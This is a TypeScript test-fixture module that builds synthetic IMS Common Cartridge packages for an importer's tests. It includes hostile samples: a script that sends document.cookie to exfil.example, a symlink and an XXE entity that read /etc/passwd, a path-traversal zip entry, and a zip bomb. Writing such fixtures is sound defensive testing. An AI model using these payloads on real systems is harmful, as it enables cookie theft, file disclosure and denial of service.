// Synthetic cartridge packages: the fixture suite's definitions, also used directly by tests that
// need a variation. Every URL is on a reserved `.example` domain.
import type { ZipEntrySpec } from "./zip-writer.ts";

const escape = (value: string) => value.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll("\"", "&quot;");

/** An `imswl` web link file. */
export const webLinkXml = (title: string, url: string) => `<?xml version="1.0" encoding="UTF-8"?>
<webLink xmlns="http://www.imsglobal.org/xsd/imsccv1p3/imswl_v1p3">
  <title>${escape(title)}</title>
  <url href="${escape(url)}" target="_iframe"/>
</webLink>
`;

/** An `imsbasiclti` LTI link file. */
export const ltiXml = (options: { title: string; launchUrl: string; secureLaunchUrl?: string; custom?: Record<string, string> }) => `<?xml version="1.0" encoding="UTF-8"?>
<cartridge_basiclti_link xmlns="http://www.imsglobal.org/xsd/imslticc_v1p3"
    xmlns:blti="http://www.imsglobal.org/xsd/imsbasiclti_v1p0"
    xmlns:lticm="http://www.imsglobal.org/xsd/imslticm_v1p0">
  <blti:title>${escape(options.title)}</blti:title>
  <blti:description>An external simulation (synthetic).</blti:description>
  <blti:custom>
${Object.entries(options.custom ?? {}).map(([name, value]) => `    <lticm:property name="${escape(name)}">${escape(value)}</lticm:property>`).join("\n")}
  </blti:custom>
  <blti:extensions platform="canvas.instructure.com">
    <lticm:property name="privacy_level">public</lticm:property>
  </blti:extensions>
  <blti:launch_url>${escape(options.launchUrl)}</blti:launch_url>
${options.secureLaunchUrl === undefined ? "" : `  <blti:secure_launch_url>${escape(options.secureLaunchUrl)}</blti:secure_launch_url>\n`}  <blti:vendor>
    <lticm:code>sim-co</lticm:code>
    <lticm:name>Simulation Co (synthetic)</lticm:name>
  </blti:vendor>
</cartridge_basiclti_link>
`;

/** Package-level LOM metadata. */
export const manifestMetadata = (options: { schema: string; version: string; title: string; description?: string; keywords?: string[]; rights?: string }) => `  <metadata>
    <schema>${options.schema}</schema>
    <schemaversion>${options.version}</schemaversion>
    <lomimscc:lom>
      <lomimscc:general>
        <lomimscc:title><lomimscc:string language="en-US">${escape(options.title)}</lomimscc:string></lomimscc:title>
${options.description === undefined ? "" : `        <lomimscc:description><lomimscc:string language="en-US">${escape(options.description)}</lomimscc:string></lomimscc:description>\n`}${(options.keywords ?? []).map((k) => `        <lomimscc:keyword><lomimscc:string language="en-US">${escape(k)}</lomimscc:string></lomimscc:keyword>\n`).join("")}      </lomimscc:general>
${options.rights === undefined ? "" : `      <lomimscc:rights>
        <lomimscc:copyrightAndOtherRestrictions><lomimscc:value>yes</lomimscc:value></lomimscc:copyrightAndOtherRestrictions>
        <lomimscc:description><lomimscc:string language="en-US">${escape(options.rights)}</lomimscc:string></lomimscc:description>
      </lomimscc:rights>\n`}    </lomimscc:lom>
  </metadata>`;

/** A manifest around the given metadata, organization items and resources. */
export const manifestXml = (parts: { identifier?: string; metadata: string; items: string; resources: string; prolog?: string }) => `<?xml version="1.0" encoding="UTF-8"?>
${parts.prolog ?? ""}<manifest identifier="${parts.identifier ?? "M_SYNTHETIC"}"
    xmlns="http://www.imsglobal.org/xsd/imsccv1p3/imscp_v1p1"
    xmlns:lomimscc="http://ltsc.ieee.org/xsd/imsccv1p3/LOM/manifest"
    xmlns:lom="http://ltsc.ieee.org/xsd/imsccv1p3/LOM/resource"
    xmlns:csmd="http://www.imsglobal.org/xsd/imscsmd_v1p0">
${parts.metadata}
  <organizations>
    <organization identifier="O_1" structure="rooted-hierarchy">
      <item identifier="LearningModules">
${parts.items}
      </item>
    </organization>
  </organizations>
  <resources>
${parts.resources}
  </resources>
</manifest>
`;

/** An organization item; a module when given children, a leaf when given a resource. */
export const item = (identifier: string, title: string, inner: { ref?: string; children?: string[] }) =>
  `<item identifier="${identifier}"${inner.ref === undefined ? "" : ` identifierref="${inner.ref}"`}><title>${escape(title)}</title>${(inner.children ?? []).join("")}</item>`;

/** A resource with one file. */
export const resource = (identifier: string, type: string, file: string, metadata = "") =>
  `    <resource identifier="${identifier}" type="${type}">${metadata}<file href="${file}"/></resource>`;

const THIN_13 = { schema: "IMS Thin Common Cartridge", version: "1.3.0" };

/** The entries of the valid Thin CC 1.3: two modules, one with a nested module, three links and an LTI link. */
export function validThinCc(overrides: { firstUrl?: string } = {}): ZipEntrySpec[] {
  const manifest = manifestXml({
    identifier: "M_ECOSYSTEMS",
    metadata: manifestMetadata({
      ...THIN_13,
      title: "Ecosystems Unit (synthetic)",
      description: "A synthetic two-week unit on producers and consumers.",
      keywords: ["ecosystems", "food webs"],
      rights: "Licensed under CC BY 4.0 by Open Lessons Collective (synthetic).",
    }),
    items: [
      item("I_WEEK1", "Week 1: Producers", {
        children: [
          item("I_PHOTO", "Photosynthesis reading", { ref: "WL_1" }),
          item("I_READINGS", "Extra readings", { children: [item("I_PLANTS", "Plant adaptations", { ref: "WL_2" })] }),
        ],
      }),
      item("I_WEEK2", "Week 2: Consumers", {
        children: [
          item("I_FOODWEB", "Food web article", { ref: "WL_3" }),
          item("I_SIM", "Food web simulation", { ref: "LTI_1" }),
        ],
      }),
    ].join("\n"),
    resources: [
      resource("WL_1", "imswl_xmlv1p3", "WL_1/weblink.xml"),
      resource("WL_2", "imswl_xmlv1p3", "WL_2/weblink.xml"),
      resource("WL_3", "imswl_xmlv1p3", "WL_3/weblink.xml"),
      resource("LTI_1", "imsbasiclti_xmlv1p3", "LTI_1/basiclti.xml"),
    ].join("\n"),
  });
  return [
    { path: "imsmanifest.xml", content: manifest },
    { path: "WL_1/weblink.xml", content: webLinkXml("Photosynthesis", overrides.firstUrl ?? "https://open-lessons.example/photosynthesis") },
    { path: "WL_2/weblink.xml", content: webLinkXml("Plant Adaptations", "https://open-lessons.example/adaptations") },
    { path: "WL_3/weblink.xml", content: webLinkXml("Food Webs", "https://open-lessons.example/food-webs") },
    {
      path: "LTI_1/basiclti.xml",
      content: ltiXml({
        title: "Food Web Simulator",
        launchUrl: "http://sim.tools.example/launch",
        secureLaunchUrl: "https://sim.tools.example/launch",
        custom: { unit: "ecosystems", difficulty: "2" },
      }),
    },
  ];
}

/** A Thin CC 1.2 whose link resources carry curriculum standards metadata: one CASE-shaped GUID and one provider code. */
export function standardsThinCc(): ZipEntrySpec[] {
  const standards = `<metadata><csmd:curriculumStandardsMetadataSet resourceLabel="ecosystems" resourcePartLabel="all">
        <csmd:curriculumStandardsMetadata providerId="CASE">
          <csmd:setOfGUIDs region="US" version="2013">
            <csmd:labelledGUID><csmd:label>MS-LS2-3</csmd:label><csmd:GUID>9B4E1C2A-7D3F-4A5B-8C6D-0E1F2A3B4C5D</csmd:GUID></csmd:labelledGUID>
          </csmd:setOfGUIDs>
        </csmd:curriculumStandardsMetadata>
        <csmd:curriculumStandardsMetadata providerId="AB">
          <csmd:setOfGUIDs region="US-MI">
            <csmd:labelledGUID><csmd:label>Science 7.2</csmd:label><csmd:GUID>AB-SYNTHETIC-0042</csmd:GUID></csmd:labelledGUID>
          </csmd:setOfGUIDs>
        </csmd:curriculumStandardsMetadata>
      </csmd:curriculumStandardsMetadataSet>
      <lom:lom><lom:general><lom:keyword><lom:string>energy flow</lom:string></lom:keyword></lom:general></lom:lom></metadata>`;
  const manifest = manifestXml({
    metadata: manifestMetadata({ schema: "IMS Thin Common Cartridge", version: "1.2.0", title: "Standards-tagged links (synthetic)" }),
    items: item("I_ENERGY", "Energy in ecosystems", { ref: "WL_1" }),
    resources: resource("WL_1", "imswl_xmlv1p2", "WL_1/weblink.xml", standards),
  });
  return [
    { path: "imsmanifest.xml", content: manifest },
    { path: "WL_1/weblink.xml", content: webLinkXml("Energy Flow", "https://open-lessons.example/energy-flow") },
  ];
}

/**
 * A full CC 1.1 with resource types this importer does not take (web content with a script, a QTI
 * assessment, a discussion topic), one web link, one LTI link, a resource no item places, and a
 * symbolic link entry.
 */
export function fullCcWithUnsupported(): ZipEntrySpec[] {
  const manifest = manifestXml({
    metadata: manifestMetadata({ schema: "IMS Common Cartridge", version: "1.1.0", title: "Full course export (synthetic)" }),
    items: item("I_MOD", "Module 1", {
      children: [
        item("I_PAGE", "Welcome page", { ref: "WC_1" }),
        item("I_QUIZ", "Quiz", { ref: "QTI_1" }),
        item("I_DISC", "Discussion", { ref: "DT_1" }),
        item("I_LINK", "Course site", { ref: "WL_1" }),
        item("I_TOOL", "Practice tool", { ref: "LTI_1" }),
        item("I_GONE", "Missing resource", { ref: "NOPE" }),
      ],
    }),
    resources: [
      `    <resource identifier="WC_1" type="webcontent" href="web_resources/welcome.html"><file href="web_resources/welcome.html"/><file href="web_resources/app.js"/></resource>`,
      resource("QTI_1", "imsqti_xmlv1p2/imscc_xmlv1p1/assessment", "QTI_1/assessment.xml"),
      resource("DT_1", "imsdt_xmlv1p1", "DT_1/topic.xml"),
      resource("WL_1", "imswl_xmlv1p1", "WL_1/weblink.xml"),
      resource("LTI_1", "imsbasiclti_xmlv1p0", "LTI_1/basiclti.xml"),
      resource("WL_2", "imswl_xmlv1p1", "WL_2/weblink.xml"),
    ].join("\n"),
  });
  return [
    { path: "imsmanifest.xml", content: manifest.replaceAll("imsccv1p3", "imsccv1p1") },
    { path: "web_resources/welcome.html", content: "<html><body><script src=\"app.js\"></script></body></html>" },
    { path: "web_resources/app.js", content: "fetch('https://exfil.example/?c=' + document.cookie);" },
    { path: "QTI_1/assessment.xml", content: "<questestinterop/>" },
    { path: "DT_1/topic.xml", content: "<topic><title>Discuss</title></topic>" },
    { path: "WL_1/weblink.xml", content: webLinkXml("Course Site", "https://course.example/") },
    { path: "WL_2/weblink.xml", content: webLinkXml("Orphan", "https://course.example/orphan") },
    { path: "LTI_1/basiclti.xml", content: ltiXml({ title: "Practice", launchUrl: "https://practice.tools.example/lti" }) },
    { path: "web_resources/link-to-secrets", content: "/etc/passwd", method: "store", symlink: true },
  ];
}

/** A valid Thin CC plus an entry whose name climbs out of the extraction directory. */
export function pathTraversal(): ZipEntrySpec[] {
  return [...validThinCc(), { path: "../../outside/evil.xml", content: "<x/>" }];
}

/** A manifest with a DOCTYPE declaring an external entity (XXE). */
export function doctypeXxe(): ZipEntrySpec[] {
  const [manifest, ...rest] = validThinCc();
  const content = (manifest!.content as string)
    .replace("<manifest ", "<!DOCTYPE manifest [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<manifest ")
    .replace("Ecosystems Unit (synthetic)", "&xxe;");
  return [{ path: "imsmanifest.xml", content }, ...rest];
}

/** A zip bomb: a valid Thin CC plus `megabytes` MiB of zeros, honestly declared or with a lying size. */
export function zipBomb(megabytes: number, declaredSize?: number): ZipEntrySpec[] {
  return [...validThinCc(), { path: "assets/bomb.bin", content: new Uint8Array(megabytes * 1024 * 1024), ...(declaredSize === undefined ? {} : { declaredSize }) }];
}
